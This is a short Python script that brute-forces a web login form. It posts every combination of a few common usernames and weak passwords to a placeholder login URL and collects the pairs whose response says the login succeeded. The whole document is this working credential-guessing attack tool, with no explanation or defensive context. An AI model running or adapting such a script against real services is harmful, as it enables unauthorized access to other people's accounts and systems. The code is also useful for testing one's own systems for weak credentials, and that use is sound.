import requests

def brute_force_login(url, username_list, password_list):
    successful_logins = []
    
    for username in username_list:
        for password in password_list:
            payload = {
                'username': username,
                'password': password
            }
            response = requests.post(url, data=payload)
            if "login successful" in response.text.lower():
                successful_logins.append((username, password))
    
    return successful_logins

if __name__ == "__main__":
    login_url = "http://example.com/login"
    usernames = ["admin", "user", "test"]
    passwords = ["password123", "123456", "admin"]
    results = brute_force_login(login_url, usernames, passwords)
    print(f"Successful logins: {results}")
